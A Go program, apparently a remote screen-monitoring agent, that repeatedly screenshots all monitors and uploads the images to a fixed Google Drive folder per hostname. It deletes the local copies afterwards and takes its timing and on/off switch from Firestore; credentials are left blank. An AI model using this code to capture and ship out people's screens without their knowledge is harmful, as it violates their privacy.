package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"cloud.google.com/go/firestore"
	firebase "firebase.google.com/go"
	"github.com/kbinani/screenshot"
	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/drive/v3"
	"google.golang.org/api/option"
)

// Retrieve a token, saves the token, then returns the generated client.
func getClient(config *oauth2.Config) *http.Client {
	tokFile := "token.json"
	tok, err := tokenFromFile(tokFile)
	if err != nil {
		tok = getTokenFromWeb(config)
		saveToken(tokFile, tok)
	}
	isDriveUploadSystemReady = true

	return config.Client(context.Background(), tok)
}

// Request a token from the web, then returns the retrieved token.
func getTokenFromWeb(config *oauth2.Config) *oauth2.Token {
	authURL := config.AuthCodeURL("state-token", oauth2.AccessTypeOffline)
	fmt.Printf("Go to the following link in your browser then type the "+
		"authorization code: \n%v\n", authURL)

	var authCode string
	if _, err := fmt.Scan(&authCode); err != nil {
		log.Fatalf("Unable to read authorization code %v", err)
	}

	tok, err := config.Exchange(context.TODO(), authCode)
	if err != nil {
		log.Fatalf("Unable to retrieve token from web %v", err)
	}
	return tok
}

// Retrieves a token from a local file.
func tokenFromFile(file string) (*oauth2.Token, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	tok := &oauth2.Token{}
	err = json.NewDecoder(f).Decode(tok)
	return tok, err
}

// Saves a token to a file path.
func saveToken(path string, token *oauth2.Token) {
	fmt.Printf("Saving credential file to: %s\n", path)
	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		log.Fatalf("Unable to cache oauth token: %v", err)
	}
	defer f.Close()
	json.NewEncoder(f).Encode(token)
}

// Main functions start from here
// Get the refresh token from firebase doc
func getClientFromFirebaseString(driveConfig *oauth2.Config) *http.Client {
	token, errTokenFromString := tokenFromFirebaseString(refreshToken)
	if errTokenFromString != nil {
		fmt.Println("Get driveClient from refresh string error:", errTokenFromString)
		isDriveUploadSystemReady = false
		saveErrorReportToFirebase(errTokenFromString)
	} else {
		isDriveUploadSystemReady = true
	}
	return driveConfig.Client(context.Background(), token)
}

func tokenFromFirebaseString(firebaseRefreshTokenString string) (*oauth2.Token, error) {
	tok := &oauth2.Token{}
	err := json.NewDecoder(strings.NewReader(firebaseRefreshTokenString)).Decode(tok)
	return tok, err
}

//Interface to string
func interfaceToString(i interface{}) string {
	str := fmt.Sprintf("%v", i)
	str = strings.Trim(str, " ")
	return str
}

//Check if internet is available or not
func connected() (ok bool) {
	_, errInternet := http.Get("http://clients3.google.com/generate_204")

	if errInternet != nil {
		fmt.Println("No internet")
		return false
	}
	return true
}

//Get file name from current time
func getCurrentFileNameByTime() string {
	currentTime := time.Now().Format(time.Kitchen)
	year, month, day := time.Now().Date()
	second := time.Now().Unix()
	currentTime = strings.Replace(currentTime, " ", "", 20)
	currentTime = strings.Replace(currentTime, "-", "_", 20)
	currentTime = strings.Replace(currentTime, ":", "_", 20)
	currentTime = strings.Replace(currentTime, ",", "_", 20)
	currentTime = strconv.Itoa(day) + "_" + month.String() + "_" + strconv.Itoa(year) + "_" + currentTime + "_" + strconv.FormatInt(second, 10)
	return currentTime
}

//Take image after certain time
func takeScreenPeriod() {
	if runScreenTakeSystem {
		numberOfMonitor := screenshot.NumActiveDisplays()
		for i := 0; i < numberOfMonitor; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, errCapture := screenshot.CaptureRect(bounds)
			if errCapture != nil {
				saveErrorReportToFirebase(errCapture)
			} else {
				//Save image
				fileName := preFixVelo + getCurrentFileNameByTime() + ".png"
				file, errFileCreate := os.Create(fileName)
				if errFileCreate != nil {
					saveErrorReportToFirebase(errFileCreate)
				} else {
					errEncodePNG := png.Encode(file, img)
					errClosingFile := file.Close()

					if errEncodePNG != nil {
						saveErrorReportToFirebase(errEncodePNG)
					} else {
						fmt.Println("Saved Filename :", fileName)
					}

					if errClosingFile != nil {
						saveErrorReportToFirebase(errClosingFile)
					}

				}
			}
		}
	} else {
		fmt.Println("runScreenTakeSystem = false now")
	}

}

func saveErrorReportToFirebase(errFrom error) {
	if isFirebaseFirestoreClientReady && connected() {
		_, _, errSavingError := firebaseFirestoreClient.Collection(errorCollection).Add(context.Background(), map[string]interface{}{
			"error":    errFrom.Error(),
			"hostname": hostName,
			"time":     getCurrentFileNameByTime(),
		})
		if errSavingError != nil {
			fmt.Println("Saving err error :", errSavingError)
			isFirebaseFirestoreClientReady = false
		}
	}
}

//Get the host name of the PC
func getReadyHostName() {
	hostName, errHostName = os.Hostname()
	if errHostName != nil {
		hostName = getCurrentFileNameByTime()
		fmt.Println("Hostname get error: ", errHostName)
		isHostNameReady = true
	} else {
		isHostNameReady = true
	}
	fmt.Println("Host name at start :", hostName)
}

//Get refreshToken
func getRefreshToken() {
	firebaseDoc, errFirebaseDoc := firebaseFirestoreClient.Collection(tokenCollection).Doc(tokenID).Get(context.Background())
	if errFirebaseDoc != nil {
		fmt.Println("Document data error: ", errFirebaseDoc)
		saveErrorReportToFirebase(errFirebaseDoc)
	} else {
		refreshTokenData = firebaseDoc.Data()
		if refreshTokenData[tokenKey] == nil {
			fmt.Println("Refresh token corrupted or missing")
			errRefreshToken := errors.New("Refresh token corrupted or missing")
			gotRefreshToken = false
			saveErrorReportToFirebase(errRefreshToken)
		} else {
			gotRefreshToken = true
			refreshToken = interfaceToString(refreshTokenData[tokenKey])
			// fmt.Println("Refresh token data: ", refreshTokenData[tokenKey])
			fmt.Println("Refresh token string: ", refreshToken)
		}
	}
}

//Get velo config
func getVeloConfigAndSave() {
	firebaseDoc, errFirebaseDoc := firebaseFirestoreClient.Collection(configCollection).Doc(configID).Get(context.Background())
	if errFirebaseDoc != nil {
		fmt.Println("Document Config data error: ", errFirebaseDoc)
		saveErrorReportToFirebase(errFirebaseDoc)
		periodTimeSecond = 10
	} else {
		configData = firebaseDoc.Data()
		if configData[configKey] == nil {
			fmt.Println("Config is corrupted or missing")
			errKeyError := errors.New("Config is corrupted or missing")
			saveErrorReportToFirebase(errKeyError)
			periodTimeSecond = 10

		} else {
			val := configData[configKey]
			peroidValue, ok := val.(int64)
			if !ok {
				fmt.Println("Config Time error: Is not a number, bool value:", ok)
				errPeriodValue := errors.New("Config Time error: Is not a number int64")
				saveErrorReportToFirebase(errPeriodValue)
				periodTimeSecond = 10
			} else {
				fmt.Println("Config Time before: ", periodTimeSecond)
				periodTimeSecond = time.Duration(peroidValue)
				fmt.Println("Config Time: ", periodTimeSecond)
			}
		}
	}
}

//Get run data
func getVeloRunDataOrCreateANew() {
	fmt.Println("Searching run data for :", hostName)
	firebaseDoc, errFirebaseDoc := firebaseFirestoreClient.Collection(runCollection).Doc(hostName).Get(context.Background())
	if errFirebaseDoc != nil {
		fmt.Println("Document Run data error: ", errFirebaseDoc)
		saveErrorReportToFirebase(errFirebaseDoc)
		fmt.Println("Trying to create new Run data with: ", hostName)
		_, errSetNewRun := firebaseFirestoreClient.Collection(runCollection).Doc(interfaceToString(hostName)).Set(context.Background(), map[string]interface{}{
			"isRunning":  true,
			"last_check": getCurrentFileNameByTime(),
		})

		if errSetNewRun != nil {
			fmt.Println("Creating new Run  error: ", errSetNewRun)
			saveErrorReportToFirebase(errSetNewRun)
			isFirebaseFirestoreClientReady = false
		}
		runUploadSystem = true
		runConfigSystem = true
		runScreenTakeSystem = true
	} else {
		runData := firebaseDoc.Data()
		if runData["isRunning"] == nil {
			fmt.Println("Run data is corrupted or missing, truing ON the velo love")
			errKeyError := errors.New("Run data is corrupted or missing, truing ON the velo love")
			saveErrorReportToFirebase(errKeyError)
			runUploadSystem = true
			runConfigSystem = true
			runScreenTakeSystem = true
		} else {
			val := runData["isRunning"]
			isRunningValue, ok := val.(bool)
			if !ok {
				fmt.Println("Running Data: Is not a bool, bool value:", ok)
				errParseRunValue := errors.New("Running Data: Is not a bool,")
				saveErrorReportToFirebase(errParseRunValue)
				runUploadSystem = true
				runConfigSystem = true
				runScreenTakeSystem = true
			} else {
				fmt.Println("Is running value :", isRunningValue)
				runUploadSystem = isRunningValue
				runConfigSystem = isRunningValue
				runScreenTakeSystem = isRunningValue

				_, errSetRun := firebaseFirestoreClient.Collection(runCollection).Doc(interfaceToString(hostName)).Set(context.Background(), map[string]interface{}{
					"isRunning":  isRunningValue,
					"last_check": getCurrentFileNameByTime(),
				})
				if errSetRun != nil {
					fmt.Println("Updateing Run  error: ", errSetRun)
					saveErrorReportToFirebase(errSetRun)
					isFirebaseFirestoreClientReady = false
				}
			}
		}
	}
}

//Create file to upload to google drive
func createFile(service *drive.Service, name string, mimeType string, content io.Reader, parentID string) (*drive.File, error) {
	f := &drive.File{
		MimeType: mimeType,
		Name:     name,
		Parents:  []string{parentID},
	}
	file, err := service.Files.Create(f).Media(content).Do()

	if err != nil {
		log.Println("Could not create file: " + err.Error())
		return nil, err
	}

	return file, nil
}

//Create folder in google drive
func createFolder(service *drive.Service, name string, parentID string) (*drive.File, error) {
	d := &drive.File{
		Name:     name,
		MimeType: "application/vnd.google-apps.folder",
		Parents:  []string{parentID},
	}

	file, err := service.Files.Create(d).Do()

	if err != nil {
		log.Println("Could not create dir: " + err.Error())
		return nil, err
	}

	return file, nil
}

//Get the firebaseClient ready for use
func getReadyFirebaseClient() {
	ctx := context.Background()
	firebaseSAFromJSONBytes := []byte(firebaseSAFromJSON)
	opt := option.WithCredentialsJSON(firebaseSAFromJSONBytes)
	app, errFirebaseNewApp := firebase.NewApp(ctx, nil, opt)
	if errFirebaseNewApp != nil {
		fmt.Println("New creating app error: ", errFirebaseNewApp)
	} else {
		firebaseFirestoreClient, errFireStoreClient = app.Firestore(ctx)
		if errFireStoreClient != nil {
			fmt.Println("Firestore client error: ", errFireStoreClient)
		} else {
			isFirebaseFirestoreClientReady = true
			errRunnings := errors.New("Running Velo Loves")
			saveErrorReportToFirebase(errRunnings)
			getRefreshToken()
		}
	}
}

//Get the driveClient ready for use
func getReadyDriveClient() {
	driveCredFromJSONBytes := []byte(driveCreadFromJSON)
	config, errDriveConfig := google.ConfigFromJSON(driveCredFromJSONBytes, drive.DriveScope)
	if errDriveConfig != nil {
		fmt.Println("Drive config error:", errDriveConfig)
		saveErrorReportToFirebase(errDriveConfig)
	} else {
		if isDevelopmentMode {
			driveClient = getClient(config)
		} else {
			driveClient = getClientFromFirebaseString(config)
		}

		if isDriveUploadSystemReady {
			driveService, errDriveService = drive.New(driveClient)
			if errDriveService != nil {
				fmt.Println("Unable to retrieve Drive client error:", errDriveService)
				saveErrorReportToFirebase(errDriveService)
				isDriveUploadSystemReady = false
			}
			fmt.Println("Drive system ready")
		} else {
			fmt.Println("Drive system not ready")
		}
	}
}

func getReadyTheDriveHostNameFolderID() {
	filesInRootFolder, errGetFolder := driveService.Files.List().Q("'" + folderID + "'" + " in parents").Do()
	if errGetFolder != nil {
		fmt.Println("Get files in the root error :", errGetFolder)
		saveErrorReportToFirebase(errGetFolder)
		isDriveHostNameFolderIDReady = false
	} else {
		if len(filesInRootFolder.Files) == 0 {
			fmt.Println("No folder found with current host name")
			hostFolder, errHostFolder := createFolder(driveService, hostName, folderID)
			if errHostFolder != nil {
				fmt.Println("Create host folder error :", errHostFolder)
				saveErrorReportToFirebase(errHostFolder)
				isDriveHostNameFolderIDReady = false
			} else {
				hostNameFolderID = hostFolder.Id
				isDriveHostNameFolderIDReady = true
			}
		} else {
			for _, i := range filesInRootFolder.Files {
				if i.MimeType == "application/vnd.google-apps.folder" {
					if i.Name == hostName {
						fmt.Println("Folder name with host name found, upload to this folder now")
						hostNameFolderID = i.Id
						isDriveHostNameFolderIDReady = true
					}
				}

			}
			if isDriveHostNameFolderIDReady == false {
				fmt.Println("No folder found with this host name, creating...")
				hostFolder, errHostFolder := createFolder(driveService, hostName, folderID)
				if errHostFolder != nil {
					fmt.Println("Create host folder error :", errHostFolder)
					saveErrorReportToFirebase(errHostFolder)
					isDriveHostNameFolderIDReady = false
				} else {
					hostNameFolderID = hostFolder.Id
					isDriveHostNameFolderIDReady = true
				}
			}
		}
	}
}

func uploadScreenShoots() {
	if runUploadSystem {
		fmt.Println("Upload system on")
	} else {
		fmt.Println("Upload system off")
	}
	for true {
		if runUploadSystem {
			{
				if isDriveHostNameFolderIDReady == false && isHostNameReady && isDriveUploadSystemReady && connected() {
					getReadyTheDriveHostNameFolderID()
				}

				if isDriveUploadSystemReady && isHostNameReady && isDriveHostNameFolderIDReady && connected() {
					files, errFiles := ioutil.ReadDir("./")
					if errFiles != nil {
						fmt.Println("PNG and all files get error:", errFiles)
						saveErrorReportToFirebase(errFiles)
					} else {
						var pngfiles []os.FileInfo
						for _, f := range files {
							extension := filepath.Ext(f.Name())
							if extension == ".png" {
								isPrefixed := strings.HasPrefix(f.Name(), preFixVelo)
								if isPrefixed {
									pngfiles = append(pngfiles, f)
								}
							}
						}
						for i, f := range pngfiles {
							fmt.Println(i, f.Name())
						}
						if len(pngfiles) > numberOfOldFileToKeep {
							for _, fileNamesWithPNG := range pngfiles {
								fmt.Println("Uploading file :", fileNamesWithPNG.Name())
								fileToUpload, errGetUploadFile := os.Open(fileNamesWithPNG.Name())
								if errGetUploadFile != nil {
									fmt.Println("Geting the file from local drive error :", errGetUploadFile)
									saveErrorReportToFirebase(errGetUploadFile)
								} else {
									fileUploaded, errUpload := createFile(driveService, hostName+fileToUpload.Name(), "image/png", fileToUpload, hostNameFolderID)
									if errUpload != nil {
										fmt.Println("Uploading error :", errUpload)
										saveErrorReportToFirebase(errUpload)
										isDriveUploadSystemReady = false
										isDriveHostNameFolderIDReady = false
									} else {
										fileToUpload.Close()
										fmt.Println("File uploaded :) :", fileUploaded.Name)
										errDelete := os.Remove(fileNamesWithPNG.Name())
										if errDelete != nil {
											fmt.Println("Deleteing error :", errDelete)
											saveErrorReportToFirebase(errDelete)
										}
									}
								}

							}
						}

					}

				} else {
					fmt.Println("No internet or Drive System is not ready")

				}
			}
		}
		time.Sleep(uploadSleepTime * time.Second)
		fmt.Println("Upload system :", runUploadSystem)
	}
}

func configSystem() {
	for true {
		if runConfigSystem {
			{
				if isFirebaseFirestoreClientReady && connected() {
					getVeloConfigAndSave()

				} else {
					fmt.Println("No internet or Firebase System is not ready configSystem")

				}
			}
		}
		time.Sleep(configSleepTime * time.Second)
		fmt.Println("Config system :", runConfigSystem)
	}
}

func runSystem() {
	for runRunSystem {
		if isFirebaseFirestoreClientReady && isHostNameReady && connected() {
			getVeloRunDataOrCreateANew()
		} else {
			fmt.Println("No internet or Firebase System or HostName is not ready for runRunSystem")
		}
		time.Sleep(runSleepTime * time.Second)
	}
}

const (
	isDevelopmentMode     bool          = false
	uploadSleepTime       time.Duration = 30
	configSleepTime       time.Duration = 600
	runSleepTime          time.Duration = 300
	numberOfOldFileToKeep int           = 3

	//Most important run
	runRunSystem bool = true

	//Firebase firestore
	prefix           string = ""
	tokenCollection  string = "token"
	errorCollection  string = "error"
	configCollection string = "config"
	runCollection    string = "run"
	tokenID          string = "myToken"
	configID         string = "myConfig"
	tokenKey         string = "token"
	configKey        string = "config"
	//Drive folder ID
	folderID string = "14qFfM5ByrJ0h9bQIcNZKzpcdfC_N-ziy"

	//Prefix
	preFixVelo string = "velo"

	firebaseSAFromJSON string = `{
	"type": "service_account",
	"project_id": "",
	"private_key_id": "",
	"private_key": "",
	"client_email": "",
	"client_id": "",
	"auth_uri": "",
	"token_uri": "n",
	"auth_provider_x509_cert_url": "",
	"client_x509_cert_url": ""
  }`
	driveCreadFromJSON string = `{
	"installed": {
	  "client_id": "",
	  "project_id": "",
	  "auth_uri": "",
	  "token_uri": "",
	  "auth_provider_x509_cert_url": "",
	  "client_secret": "",
	  "redirect_uris": ["urn:ietf:wg:oauth:2.0:oob", "http://localhost"]
	}
  }`
)

var (
	firebaseFirestoreClient *firestore.Client
	errFireStoreClient      error
	hostName                string
	errHostName             error
	driveClient             *http.Client
	driveService            *drive.Service
	errDriveService         error
)

var (
	gotRefreshToken  bool = false
	refreshTokenData map[string]interface{}
	refreshToken     string
	configData       map[string]interface{}
	hostNameFolderID string
)

var (
	infinitePeriodScreenShot bool = true
	runUploadSystem          bool = true
	runConfigSystem          bool = true
	runScreenTakeSystem      bool = true
)

var (
	//Getting this period from firebase also
	periodTimeSecond               time.Duration = 10
	isNewRefreshTokenNowReady      bool          = false
	isFirebaseFirestoreClientReady bool          = false
	isHostNameReady                bool          = false
	isDriveUploadSystemReady       bool          = false
	isDriveHostNameFolderIDReady   bool          = false
)

func main() {
	fmt.Println("2.1")

	go uploadScreenShoots()

	go configSystem()

	go runSystem()

	// Main loop
	for infinitePeriodScreenShot {
		if isHostNameReady == false {
			getReadyHostName() //No matter what this will return a genuine  or dummy dost name
		}

		takeScreenPeriod()

		if isFirebaseFirestoreClientReady == false && connected() {
			getReadyFirebaseClient()
		}

		if isFirebaseFirestoreClientReady && gotRefreshToken == false && connected() {
			getRefreshToken()
		}

		if gotRefreshToken && isDriveUploadSystemReady == false && connected() {
			getReadyDriveClient()
		}

		time.Sleep(periodTimeSecond * time.Second)
	}
}
